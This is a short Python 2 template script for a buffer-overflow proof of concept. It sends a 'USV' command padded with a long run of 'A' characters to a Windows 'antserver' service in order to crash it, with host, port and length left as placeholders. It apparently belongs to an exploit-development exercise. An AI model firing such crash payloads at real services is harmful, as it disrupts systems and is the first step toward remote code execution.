#!/usr/bin/env	python
# -*- coding: utf-8 -*--

import socket
host = "<windows-ip-address>"
port = <antserver-port>

buffer ="A" * USE_A_NUMBER_HERE # cause the crash

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((host,port))
	data=s.recv(1024)
	print "\n" + data
	s.send("USV " + buffer + '\r\n\r\n')
except:
	print "Check your debugger"

s.close()
print "Buffer Sent Successfully!"

